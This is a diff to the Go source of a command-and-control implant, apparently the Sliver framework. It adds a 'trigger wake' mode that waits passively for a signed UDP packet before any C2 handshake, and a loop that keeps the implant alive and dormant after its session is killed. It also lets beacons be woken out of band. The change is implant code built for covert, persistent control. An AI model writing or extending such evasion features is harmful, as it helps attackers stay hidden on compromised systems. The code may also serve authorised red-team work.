@@ -124,6 +124,55 @@ func Main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
+	// {{if .Config.TTLEnabled}}
+	startTTLWatchdog()
+	// {{end}}
+
+	// {{if .Config.IncludeTriggerWake}}
+	// Start the passive UDP trigger listener FIRST, before any C2
+	// handshake. The trigger implant's purpose is covert wake-on-demand
+	// over UDP -- an initial beacon/HTTP handshake would defeat that.
+	startTriggerWake()
+
+	// Trigger-implant main loop: block until wake, run session, then
+	// return to dormant state. The loop ensures that `sessions -k`
+	// does NOT kill the process -- it only ends the session, and the
+	// implant goes back to sleep waiting for the next wake trigger.
+	for {
+		// Drain any stale wake signal before blocking.
+		transports.ResetWake()
+
+		// {{if .Config.Debug}}
+		log.Printf("[triggerwake] waiting for wake trigger before C2 startup...")
+		// {{end}}
+		transportHint := <-transports.WakeChannel()
+		// {{if .Config.Debug}}
+		log.Printf("[triggerwake] wake received (transport=%q), proceeding to C2 startup", transportHint)
+		// {{end}}
+
+		// Apply transport preference from the wake packet.
+		transports.SetPreferredTransport(transportHint)
+
+		// Reset connection errors so previous session failures don't
+		// prevent the new session from connecting.
+		connectionErrors = 0
+
+		// {{if .Config.IsBeacon}}
+		beaconStartup()
+		// {{else}} ------- IsBeacon/IsSession -------
+		sessionStartup()
+		// {{end}}
+
+		// Session/beacon returned -- clear the transport preference
+		// so the next wake can specify a fresh one.
+		transports.SetPreferredTransport("")
+
+		// {{if .Config.Debug}}
+		log.Printf("[triggerwake] session ended, returning to dormant wake-wait state")
+		// {{end}}
+	}
+	// {{else}} ------- IncludeTriggerWake -------
+
 	// {{if .Config.IsService}}
 	svc.Run("", &sliverService{})
 	// {{else}}
@@ -135,6 +184,8 @@ func Main() {
 	// {{end}}
 
 	// {{end}} ------- IsService -------
+
+	// {{end}} ------- IncludeTriggerWake -------
 }
 
 // {{if .Config.IsBeacon}}
@@ -297,6 +348,10 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-time.After(duration):
 		case <-shortCircuit:
 			// Short circuit current duration with no error
+		case <-transports.WakeChannel(): // value (transport hint) intentionally discarded for beacons
+			// Out-of-band wake (e.g., triggerwake transport received a
+			// signed UDP wake task). Same effect as shortCircuit:
+			// stop sleeping, proceed to next check-in.
 		}
 
 		// check if reconfig used to set a new C2-URI 
